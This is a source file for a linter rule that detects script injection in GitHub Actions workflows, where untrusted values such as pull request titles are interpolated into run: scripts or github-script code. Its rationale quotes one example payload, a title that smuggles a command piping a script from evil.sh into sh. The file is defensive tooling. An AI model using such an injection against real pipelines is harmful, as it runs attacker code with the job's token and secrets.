import { defineRule, steps } from "../helpers.js";
import { usesAction } from "../caching/shared.js";
import { ENV_FILE_WRITE, scriptLines, untrustedExpressions } from "./shared.js";

export default defineRule({
  meta: {
    id: "security/expression-injection",
    ruleset: "security",
    description:
      "Attacker-controlled `${{ }}` values (titles, bodies, branch names, commit messages) must not be interpolated directly into `run:` scripts or `github-script` code.",
    rationale:
      "Expressions are substituted into the script text before the shell or JavaScript runtime parses it, so a pull request title like `a\"; curl evil.sh | sh; #` becomes code. The job then runs that code with its token and secrets. Passing the value through an environment variable makes it plain data that the script reads at run time.",
    kind: "practice",
    defaultSeverity: "error",
    presets: ["recommended", "agentic", "strict"],
    requires: [],
    defaultOptions: {},
    references: [
      "https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks",
      "https://securitylab.github.com/resources/github-actions-untrusted-input/",
    ],
    impact: "high",
    example: {
      bad: '- run: echo "Title: ${{ github.event.pull_request.title }}"',
      good: '- env:\n    PR_TITLE: ${{ github.event.pull_request.title }}\n  run: echo "Title: $PR_TITLE"',
    },
  },
  check({ project, report }) {
    for (const { workflow, step } of steps([...project.workflows, ...project.actions])) {
      if (step.run) {
        for (const line of scriptLines(step)) {
          // Writes into $GITHUB_ENV/$GITHUB_PATH/$GITHUB_OUTPUT are reported by security/env-file-injection.
          if (ENV_FILE_WRITE.test(line.text)) continue;
          for (const expression of untrustedExpressions(line.text)) {
            report({
              path: workflow.path,
              line: line.line,
              key: `${step.key}.run`,
              message: `\`${expression.context}\` is interpolated into a shell script, where a crafted value becomes code.`,
              suggestion: `Map it to an environment variable on the step (e.g. \`env: { VALUE: ${expression.text} }\`) and reference \`"$VALUE"\` in the script.`,
            });
          }
        }
      }
      if (usesAction(step, "actions/github-script")) {
        const script = step.with.get("script");
        if (typeof script?.value !== "string") continue;
        const seen = new Set<string>();
        for (const expression of untrustedExpressions(script.value)) {
          if (seen.has(expression.context)) continue;
          seen.add(expression.context);
          report({
            path: workflow.path,
            line: script.line,
            key: `${step.key}.with.script`,
            message: `\`${expression.context}\` is interpolated into github-script code, where a crafted value becomes JavaScript.`,
            suggestion:
              "Read the value from the `context` object (e.g. `context.payload.pull_request.title`) or pass it through `env:` and `process.env`.",
          });
        }
      }
    }
  },
});
